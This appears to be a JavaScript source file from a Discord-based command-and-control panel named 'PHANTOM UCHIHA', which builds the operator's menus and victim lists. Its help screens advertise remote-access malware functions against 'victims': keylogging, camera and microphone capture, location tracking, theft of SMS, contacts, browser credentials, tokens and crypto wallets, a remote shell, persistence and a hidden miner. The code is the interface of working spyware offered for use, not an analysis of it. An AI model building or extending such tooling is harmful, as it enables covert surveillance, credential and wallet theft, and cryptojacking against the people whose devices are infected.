import { EmbedBuilder } from 'discord.js'
import { C, E, A, ST_COL, smallCaps, mono, createBox, barAnim, clockText, bold, randGif, ts } from '../utils/index.js'

export function bloodEmbed(title, status, desc, opts = {}) {
  const thumb = opts.thumb || randGif()
  const image = opts.image || randGif()
  const e = new EmbedBuilder()
    .setColor(ST_COL[status] || C.sharingan)
    .setTitle(title)
    .setDescription(desc)
    .setThumbnail(thumb)
    .setImage(image)
    .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
  if (opts.fields) e.addFields(opts.fields)
  return { embeds: [e] }
}

export function menuEmbed() {
  const clk = clockText()
  const total = [...(global.deviceStatus || new Map()).values()].filter(s => s.online === true).length
  const totalDevices = (global.deviceStatus || new Map()).size
  const offlineCount = totalDevices - total
  return bloodEmbed(bold(`${E.sharingan} PHANTOM UCHIHA ${E.sharingan}`), 'info',
    `**${E.flame} C2 Framework v3.0**\n${clk}\n\n` +
    `**${E.ghost} ${totalDevices} device(s)** — ${total} online | ${offlineCount} offline\n\n` +
    `**${E.eye} Quick Commands**\n` +
    `• \`!devices\` — List all victims\n` +
    `• \`!target <name>\` — Select victim\n` +
    `• \`!untarget\` — Clear target\n` +
    `• \`!broadcast <cmd>\` — Send to ALL\n` +
    `• \`!send <cmd> <victim>\` — Direct send\n` +
    `• \`!help\` — Full command reference\n` +
    `• \`!history\` — Your command log\n` +
    `• \`!search <query>\` — Find victim\n\n` +
    `**${E.star} Slash Commands**\n` +
    `• \`/menu\` \`/help\` \`/devices\` \`/target\`\n` +
    `• \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\`\n\n` +
    `**${total > 0 ? `${E.knife} Ready — select a victim to begin` : `${E.coffin} Waiting for devices...`}**`,
    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: randGif() })
}

export function helpEmbed() {
  const clk = clockText()
  const box = createBox(
    `${A.brightCyan}${smallCaps('commands')}${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}RECON${A.reset}       : !ping !info !status !ip !uptime !debug !restart\n` +
    `${A.cyan}┃${A.reset}                : !sysinfo !antidetect !sysprop !services !apps !storage\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.red}SURVEILL${A.reset}     : !screenshot !camera !mic !location !clipboard !keylog\n` +
    `${A.cyan}┃${A.reset}                : !stream [start|stop|fps] !notifications\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}DATA${A.reset}        : !contacts !sms !call_log !wifi !battery !processes\n` +
    `${A.cyan}┃${A.reset}                : !installed !torch !vibrate\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.brightRed}GRABBER${A.reset}     : !grabber [all|browser|messenger|tokens|wallets|files|clipboard]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}ADVANCED${A.reset}    : !wifipass !netstat !shell !persist\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.red}CONTROL${A.reset}     : !admin !overlay !click !input !open !screen !gesture !pin\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}MINING${A.reset}      : !miner [start|stop|status|set_wallet|set_pool|set_threads]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.brightCyan}SYSTEM${A.reset}      : !update [check|push|install|clear|status]\n` +
    `${A.cyan}┃${A.reset}                : !config [get|push|reset]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}UPLOAD${A.reset}      : !upload <file_path>\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.green}◈ ${clk}${A.reset}`,
    'neon', 56
  )
  const e = new EmbedBuilder()
    .setColor(C.sharingan)
    .setTitle(`${E.sharingan} PHANTOM UCHIHA — COMMAND REFERENCE`)
    .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
    .setThumbnail(randGif())
    .setImage(randGif())
    .addFields(
      { name: `${E.zap} RECON`, value: '`!ping` `!info` `!status` `!ip` `!uptime` `!debug` `!restart`', inline: true },
      { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
      { name: `${E.book} DATA`, value: '`!contacts` `!sms` `!call_log` `!wifi` `!battery` `!processes`', inline: true },
      { name: `${E.diamond} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets]`', inline: true },
      { name: `${E.flame} ADVANCED`, value: '`!wifipass` `!netstat` `!shell` `!persist`', inline: true },
      { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen`', inline: true },
      { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
      { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
    )
    .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}` })
  return { embeds: [e] }
}

export function buildDevicePages(guild, deviceStatus, getPhantomChannels) {
  const channels = getPhantomChannels(guild)
  const sorted = [...channels.values()].sort((a, b) => a.name.localeCompare(b.name, 'en'))
  if (!sorted.length) return []
  const onlineCount = sorted.filter(ch => deviceStatus.get(ch.id)?.online === true).length
  const pages = []
  for (let i = 0; i < sorted.length; i += 5) {
    const slice = sorted.slice(i, i + 5)
    const lines = [`${A.brightCyan}${smallCaps('victims')}${A.reset}`]
    for (const ch of slice) {
      const st = deviceStatus.get(ch.id)
      const on = st?.online ?? false
      const ago = st?.lastSeen ? `${Math.round((Date.now() - st.lastSeen) / 60000)}m` : '?'
      const status = on ? `${A.green}${E.sparkles} ALIVE${A.reset}` : `${A.grey}${E.coffin} DEAD${A.reset}`
      const dot = on ? E.online : E.offline
      const bar = on ? barAnim(1, 1, 5) : '░░░░░'
      lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name.replace('phantom-', ''))} ${bar} ${status} ${A.grey}(${ago})${A.reset}`)
    }
    lines.push('')
    const pct = sorted.length ? Math.round((onlineCount / sorted.length) * 100) : 0
    lines.push(`${A.green}◈ ${onlineCount}/${sorted.length} alive ${E.flame}(${pct}%)${A.reset}`)
    const body = createBox(lines.join('\n'), 'neon', 40)
    const p = Math.floor(i / 5) + 1
    const t = Math.ceil(sorted.length / 5)
    const { embeds } = bloodEmbed(bold(`${E.sharingan} VICTIMS: ${sorted.length}`), onlineCount > 0 ? 'online' : 'offline',
      `\`\`\`ansi\n${body}\n\`\`\``,
      { footer: `${smallCaps('page')} ${p}/${t} ${E.rocket} ${onlineCount}/${sorted.length} alive`, thumb: randGif() })
    pages.push({ embeds, page: p, total: t })
  }
  return pages
}
